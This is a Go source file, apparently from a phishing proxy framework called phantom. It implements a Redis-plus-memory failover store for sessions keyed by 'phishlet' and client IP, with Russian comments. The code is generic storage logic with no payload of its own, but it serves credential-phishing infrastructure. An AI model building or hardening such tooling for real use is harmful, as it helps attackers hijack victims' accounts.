// Failover SessionStore: dual-write Redis+memory, read Redis→memory.
// Если Redis падает, сессии созданные до падения живы в memory.
// Если Redis недоступен со старта, работает как pure memory.
package redisstore

import (
	"context"

	"github.com/phantom-v2/phantom/core"
	"github.com/phantom-v2/phantom/core/session"
)

type Failover struct {
	Primary  *Store
	Fallback *session.Memory
}

func NewFailover(primary *Store, fallback *session.Memory) *Failover {
	return &Failover{Primary: primary, Fallback: fallback}
}

func (f *Failover) Create(ctx context.Context, phishlet, ip string) (*core.Session, error) {
	if f.Primary != nil {
		if sess, err := f.Primary.Create(ctx, phishlet, ip); err == nil {
			f.Fallback.Put(sess) // зеркало: тот же ID
			return sess, nil
		}
	}
	return f.Fallback.Create(ctx, phishlet, ip)
}

func (f *Failover) Get(ctx context.Context, id string) (*core.Session, error) {
	if f.Primary != nil {
		if sess, err := f.Primary.Get(ctx, id); err == nil {
			return sess, nil
		}
	}
	return f.Fallback.Get(ctx, id)
}

// Drop сбрасывает сессию в обоих сторах.
func (f *Failover) Drop(ctx context.Context, id string) error {
	if f.Primary != nil {
		_ = f.Primary.Drop(ctx, id)
	}
	return f.Fallback.Drop(ctx, id)
}
